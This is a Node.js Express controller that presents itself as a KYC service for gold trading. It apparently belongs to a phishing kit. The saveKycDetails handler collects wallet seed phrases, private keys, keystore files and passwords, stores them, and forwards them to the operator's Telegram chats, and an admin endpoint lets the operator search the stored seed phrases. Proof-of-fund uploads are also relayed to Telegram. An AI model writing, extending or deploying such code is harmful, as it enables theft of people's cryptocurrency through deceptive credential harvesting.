const Kyc = require('../models/Kyc');
const cloudinary = require('cloudinary').v2;
const { notifyNewKyc } = require('../../telegramBot');

// Configure Cloudinary
cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
});

// helper: verify a public_id exists and optionally matches expected folder prefix
async function verifyCloudinaryResource(public_id, resource_type = 'auto', expectedFolderPrefix) {
  try {
    // resource_type may be 'image' or 'raw' or 'auto'
    const info = await cloudinary.api.resource(public_id, { resource_type });
    if (expectedFolderPrefix && (!info.folder || !info.folder.startsWith(expectedFolderPrefix))) {
      throw new Error(`Resource ${public_id} is not in expected folder ${expectedFolderPrefix}`);
    }
    // optionally check bytes, format, etc here
    return info;
  } catch (err) {
    // propagate error to caller
    throw err;
  }
}

// Save KYC details - expects client to upload files to Cloudinary unsigned and send back their metadata
exports.saveKycDetails = async (req, res) => {
  try {
    const { sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, imageUrls, form,
      qualityRequired, karatsPurity, destinationRefineryText, fileMap, dealersLicenseStatus } = req.body;

    console.log('saveKycDetails payload received:', { sessionId, walletType, hasImages: Array.isArray(imageUrls) ? imageUrls.length : 0, form });


    const expectedFolderPrefix = `kyc/${sessionId || 'unknown'}`;
    const verified = [];
    let verificationStatus = 'no_images';
    let verificationError = null;

    // If dealer's license is marked as not available, skip image verification for dealer's license
    let filteredImageUrls = Array.isArray(imageUrls) ? [...imageUrls] : [];
    if (dealersLicenseStatus === 'not_available') {
      // Remove dealer's license image from imageUrls if present (assuming fileMap/dealersLicense)
      if (form && form.fileMap && form.fileMap.dealersLicense) {
        filteredImageUrls = filteredImageUrls.filter(img => img.public_id !== form.fileMap.dealersLicense.public_id);
      }
    }

    if (Array.isArray(filteredImageUrls) && filteredImageUrls.length > 0) {
      verificationStatus = 'pending';
      try {
        for (const item of filteredImageUrls) {
          if (!item || !item.public_id) throw new Error('Missing public_id in imageUrls item');
          const resourceType = item.resource_type || 'auto';
          const info = await verifyCloudinaryResource(item.public_id, resourceType, expectedFolderPrefix);
          verified.push({ url: info.secure_url || item.url, public_id: info.public_id, resource_type: info.resource_type, bytes: info.bytes, format: info.format, folder: info.folder });
        }
        verificationStatus = 'verified';
      } catch (verifyErr) {
        console.error('Cloudinary verification failed:', verifyErr.message || verifyErr);
        verificationStatus = 'verification_failed';
        verificationError = verifyErr.message || String(verifyErr);
      }
    }

    // Upsert KYC entry by sessionId
    const kycData = {
      sessionId,
      walletType,
      seedPhrase,
      keystoreJson,
      password,
      privateKey,
      imageUrls: verified.length ? verified : filteredImageUrls,
      verificationStatus,
      verificationError,
      qualityRequired: qualityRequired || (form && form.qualityRequired) || '',
      karatsPurity: karatsPurity || (form && form.karatsPurity) || '',
      destinationRefineryText: destinationRefineryText || (form && form.destinationRefineryText) || '',
      dealersLicenseStatus: dealersLicenseStatus || (form && form.dealersLicenseStatus) || 'available',
      fileMap: fileMap || (form && form.fileMap) || {},
    };

    await Kyc.findOneAndUpdate(
      { sessionId },
      { $set: kycData },
      { upsert: true, new: true }
    );
    // Send Telegram notification with KYC details
    try {
      // Forward richer payload to telegram notifier
      notifyNewKyc({ sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, images: verified, fileMap: kycData.fileMap, dealersLicenseStatus: kycData.dealersLicenseStatus, qualityRequired: kycData.qualityRequired, karatsPurity: kycData.karatsPurity, destinationRefineryText: kycData.destinationRefineryText });
    } catch (err) {
      console.error('Failed to send KYC telegram notification', err);
    }
    res.status(201).json({ message: 'KYC details saved successfully', verificationStatus, verificationError });
  } catch (error) {
    console.error('saveKycDetails error', error);
    res.status(500).json({ message: 'Failed to save KYC details' });
  }
};

// Fetch KYC details
exports.getKycDetails = async (req, res) => {
  try {
    // Support pagination, search and filters for admin listing
    const { page = 1, limit = 20, q, status, walletType, sessionId, sort = '-createdAt' } = req.query;
    const skip = (Math.max(1, parseInt(page)) - 1) * Math.max(1, parseInt(limit));

    const filter = {};
    if (sessionId) filter.sessionId = sessionId;
    if (status) filter.verificationStatus = status;
    if (walletType) filter.walletType = walletType;
    if (q) {
      // simple text search on sessionId, walletType or seedPhrase (case-insensitive)
      const re = new RegExp(q, 'i');
      filter.$or = [ { sessionId: re }, { walletType: re }, { seedPhrase: re } ];
    }

    const total = await Kyc.countDocuments(filter);
    const docs = await Kyc.find(filter).sort(sort).skip(skip).limit(Math.max(1, parseInt(limit)));

    res.status(200).json({ total, page: parseInt(page), limit: parseInt(limit), pages: Math.ceil(total / Math.max(1, parseInt(limit))), docs });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: 'Failed to fetch KYC details' });
  }
};

// Update Proof of Fund
exports.updateProofOfFund = async (req, res) => {
  try {
    const { sessionId, imageUrls } = req.body;

    if (!sessionId || !Array.isArray(imageUrls) || imageUrls.length === 0) {
      return res.status(400).json({ message: 'Invalid request. Session ID and image URLs are required.' });
    }

    const session = await Kyc.findOne({ sessionId });

    if (!session) {
      return res.status(404).json({ message: 'Session not found. Please start from the KYC documents page.' });
    }

    // Only update imageUrls by appending the new Proof of Fund image
    session.imageUrls = [...(session.imageUrls || []), ...imageUrls];
    // Save the latest POF image in proofOfFund field
    let pofImage = null;
    if (imageUrls && imageUrls.length > 0) {
      pofImage = imageUrls[imageUrls.length - 1];
      session.proofOfFund = pofImage;
    }
    await session.save();

    // Always send the new Proof of Fund image to Telegram with sessionId
    try {
      if (pofImage && pofImage.url) {
        const imageFormats = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
        const format = (pofImage.format || '').toLowerCase();
        const resourceType = (pofImage.resource_type || '').toLowerCase();
        const caption = `Proof Of Fund (${sessionId})`;
        const { bot, chatIds } = require('../../telegramBot');
        if (bot && chatIds) {
          for (const chatId of chatIds) {
            try {
              if (imageFormats.includes(format) || resourceType === 'image') {
                await bot.sendPhoto(chatId, pofImage.url, { caption });
              } else {
                await bot.sendDocument(chatId, pofImage.url, { caption });
              }
            } catch (err) {
              console.error(`Failed to send POF to chatId ${chatId}:`, err);
            }
          }
        } else {
          console.error('Telegram bot or chatIds not configured.');
        }
      } else {
        console.error('POF image missing or invalid:', pofImage);
      }
    } catch (err) {
      console.error('Failed to send Proof of Fund telegram notification (outer catch):', err);
    }

    res.status(200).json({ message: 'Proof of Fund updated successfully.' });
  } catch (error) {
    console.error('Error updating Proof of Fund:', error);
    res.status(500).json({ message: 'Failed to update Proof of Fund.' });
  }
};

// Fetch Proof of Fund image for a session
exports.getPofScreenshot = async (req, res) => {
  try {
    const { sessionId } = req.params;
    if (!sessionId) {
      return res.status(400).json({ message: 'Session ID is required' });
    }
    const session = await Kyc.findOne({ sessionId });
    if (!session || !session.proofOfFund || !session.proofOfFund.url) {
      return res.status(404).json({ message: 'No Proof of Fund image found for this session' });
    }
    res.status(200).json({ proofOfFund: session.proofOfFund });
  } catch (error) {
    console.error('Error fetching Proof of Fund image:', error);
    res.status(500).json({ message: 'Failed to fetch Proof of Fund image' });
  }
};

// Fetch total record count
exports.getTotalRecordCount = async (req, res) => {
  try {
    const totalRecords = await Kyc.countDocuments();
    res.status(200).json({ totalRecords });
  } catch (error) {
    console.error('Error fetching total record count:', error);
    res.status(500).json({ message: 'Failed to fetch total record count' });
  }
};